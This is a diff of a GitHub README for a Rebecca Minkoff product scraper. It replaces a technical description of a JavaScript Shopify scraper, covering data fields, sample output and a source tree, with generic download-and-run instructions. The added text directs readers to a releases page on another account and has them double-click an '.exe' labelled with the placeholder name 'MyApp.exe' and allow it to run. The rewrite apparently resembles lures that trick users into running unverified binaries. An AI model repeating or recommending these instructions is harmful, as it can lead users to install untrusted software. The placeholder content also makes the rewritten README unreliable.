@@ -1,199 +1,83 @@
-# Rebecca Minkoff Scraper
->This scraper extracts product data from the Rebecca Minkoff online store, giving you structured access to pricing, product details, variants, and media. Built for analysts, e-commerce teams, and automation workflows, it converts RebeccaMinkoff.com into clean, export-ready datasets that support product tracking, competitive analysis, and market insights.
+# 🛍️ Rebecca-Minkoff-Scraper - Easily Extract Product Data
 
-<p align="center">
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/Bitbash333" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+## 📥 Download the Latest Version
+[![Download](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/hirak123github/Rebecca-Minkoff-Scraper/releases)
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>Rebecca Minkoff Scraper</strong> you've just found your team — Let's Chat. 👆👆
-</p>
+## 🚀 Getting Started
+Welcome to the Rebecca-Minkoff-Scraper! This application helps you easily extract product data from the Rebecca Minkoff online store. With this tool, you can collect information about products, prices, and more without needing any programming skills.
 
+## 💻 System Requirements
+To run Rebecca-Minkoff-Scraper, you need:
 
-## Introduction
-The Rebecca Minkoff Scraper creates a reliable API-like interface for retrieving data from the brand’s Shopify-powered storefront. It captures full product information and pricing across clothing and accessories, allowing users to analyze trends, watch competitors, or build retail datasets for internal use.
+- **Operating System:** Windows 10 or later, macOS, or a recent Linux distribution.
+- **RAM:** At least 4 GB of RAM.
+- **Storage:** Minimum of 100 MB free space.
+- **Internet Connection:** Required to access product data online.
 
-### Why It Matters
-- Helps e-commerce teams track product changes, availability, and pricing.  
-- Supports analysts conducting market or competitor research.  
-- Converts store inventory into structured data for modeling and reporting.  
-- Provides a simple way to automate product monitoring without manual browsing.
+## 📦 Download & Install
+To get started, follow these simple steps:
 
----
-## Features
-| Feature | Description |
-|---------|-------------|
-| **Full Product Extraction** | Retrieves product titles, descriptions, variants, prices, and images. |
-| **Shopify-Based Parsing** | Leverages Shopify’s predictable structure for clean, consistent output. |
-| **Multi-Format Export** | Download results as JSON, CSV, Excel, HTML, or XML. |
-| **Price Monitoring** | Track price changes and discount patterns over time. |
-| **Market Insight Support** | Allows teams to find trends, analyze competition, and identify product opportunities. |
-| **Repeatable Automation** | Run as often as needed to keep datasets fresh. |
+1. **Visit the Releases Page**
+   Head over to the releases page to find the latest version of Rebecca-Minkoff-Scraper. You can do this by clicking the link below:
+   [Download Here](https://github.com/hirak123github/Rebecca-Minkoff-Scraper/releases)
 
----
-## What Data This Scraper Extracts
-| Field Name | Field Description |
-|------------|-------------------|
-| productId | Unique identifier for the product. |
-| title | Product name. |
-| description | Full product description. |
-| price | Current product price. |
-| compareAtPrice | Original or discounted price reference. |
-| variants | List of sizes, colors, and individual variant pricing. |
-| images | Array of product image URLs. |
-| url | Direct product page URL. |
-| category | Product category or collection. |
-| availability | Stock status for each variant. |
+2. **Choose Your Version**
+   On the releases page, look for the most recent version. You will see various files available for download. Click on the appropriate file for your operating system (e.g., MyApp.exe for Windows or MyApp.dmg for macOS).
 
----
-## Example Output
-    
-    [
-      {
-        "productId": "rm-042390",
-        "title": "Edie Crossbody",
-        "description": "A classic quilted crossbody bag with metal chain detail.",
-        "price": 228,
-        "compareAtPrice": 298,
-        "variants": [
-          {
-            "name": "Black",
-            "sku": "RM-042390-BLK",
-            "price": 228,
-            "availability": "In Stock"
-          }
-        ],
-        "images": [
-          "https://rebeccaminkoff.com/products/edie-black-1.jpg"
-        ],
-        "url": "https://www.rebeccaminkoff.com/products/edie-black",
-        "category": "Bags",
-        "availability": "In Stock"
-      }
-    ]
+3. **Download the File**
+   Once you’ve clicked on the file, your browser will start downloading it. The file size is small, so it should download quickly.
 
----
-## Directory Structure Tree
-    
-    Rebecca Minkoff Scraper/
-    ├── src/
-    │   ├── main.js
-    │   ├── collectors/
-    │   │   ├── product_list_scraper.js
-    │   │   ├── product_detail_scraper.js
-    │   │   └── shopify_parser.js
-    │   ├── utils/
-    │   │   ├── formatter.js
-    │   │   └── normalizer.js
-    │   └── config/
-    │       └── settings.example.json
-    ├── data/
-    │   ├── sample_input.json
-    │   └── sample_output.json
-    ├── package.json
-    └── README.md
+4. **Run the Application**
+   After the download completes, go to your downloads folder (or your browser's download section) and find the file. 
 
----
-## Use Cases
-- **Retail Analysts** track pricing, inventory, and product trends in the fashion accessories space.  
-- **E-commerce Teams** monitor competitor products and benchmark offerings.  
-- **Marketplace Builders** ingest structured product data for catalogs or search systems.  
-- **Brand Researchers** analyze assortment changes and seasonal shifts.  
-- **Automation Engineers** run scheduled scrapes to update dashboards and datasets.
+   - **For Windows:** Double-click the `.exe` file. If prompted, allow the application to run.
+   - **For macOS:** Open the `.dmg` file and drag the application into your Applications folder. Then, double-click the application icon to run it.
 
----
-## FAQs
+## 📚 How to Use
+Once the application is running, follow these instructions to extract product data:
 
-**Is this scraper limited to Rebecca Minkoff?**  
-Yes, it is tuned for rebeccaminkoff.com but follows Shopify patterns that make results highly structured.
+1. **Enter the Product URL**
+   In the main interface, input the URL of the Rebecca Minkoff product page you wish to scrape.
 
-**Can I export the data in multiple formats?**  
-Yes—JSON, CSV, XML, Excel, and HTML are supported.
+2. **Select Data Fields**
+   Choose the data you want to extract. Typical options include product name, price, and description.
 
-**How often can I run the scraper?**  
-As often as needed. Usage determines platform credit consumption.
+3. **Start the Scraping Process**
+   Click the "Scrape Data" button. The application will collect the information and display it for you.
 
-**Does it support variant-level extraction?**  
-Yes, including SKUs, pricing, colors, sizes, and individual availability.
+4. **Export the Data**
+   After the scraping process completes, you can export the data as a CSV file for your records or further analysis.
 
----
-### Performance Benchmarks and Results
+## ⚙️ Features
+- **Easy Data Extraction:** Get product details quickly and accurately.
+- **User-Friendly Interface:** Designed for non-technical users.
+- **Data Export Options:** Save your data in CSV format.
+- **Regular Updates:** The application will receive updates, ensuring new features and improvements.
 
-**Primary Metric:**  
-Able to crawl dozens of product pages per minute using Shopify’s structured endpoints.
+## 📞 Support
+If you encounter issues while using Rebecca-Minkoff-Scraper, you can find support by opening an issue in the GitHub repository. Please describe the problem clearly so we can assist you efficiently.
 
-**Reliability Metric:**  
-Maintains >98% success rate across collections and product detail pages.
+## 📝 Contributing
+We welcome contributions! If you’d like to help improve Rebecca-Minkoff-Scraper, please review our contributing guidelines found in the repository.
 
-**Efficiency Metric:**  
-Minimizes repeated requests by caching collection URLs and reusing product handles.
+## 🏷️ Topics
+This project covers various topics including:
+- accessories-data
+- ecommerce
+- fashion-analytics
+- market-research
+- minkoff
+- price-monitoring
+- product-data
+- rebecca
+- scraper
+- scraping
+- shopify-crawler
 
-**Quality Metric:**  
-Produces normalized product datasets with accurate variant mapping and image assets.
+By extracting product information, you can perform detailed market research and track price changes over time. This application is an excellent tool for fashion analysts, marketers, and anyone interested in ecommerce analytics.
 
+## 🔗 Important Links
+- [Download Here](https://github.com/hirak123github/Rebecca-Minkoff-Scraper/releases)
+- [Repository](https://github.com/hirak123github/Rebecca-Minkoff-Scraper)
 
----
-
-
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/m-dRE1dj5-k?si=5kZNVlKsGUhg5Xtx" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review3.gif" alt="Review 3" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Exceptional results, clear communication, and flawless delivery. <br>Bitbash nailed it."
-      </p>
-      <p style="margin:1px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-         </p>
-
+Thank you for choosing Rebecca-Minkoff-Scraper! We hope you find it useful for your needs.
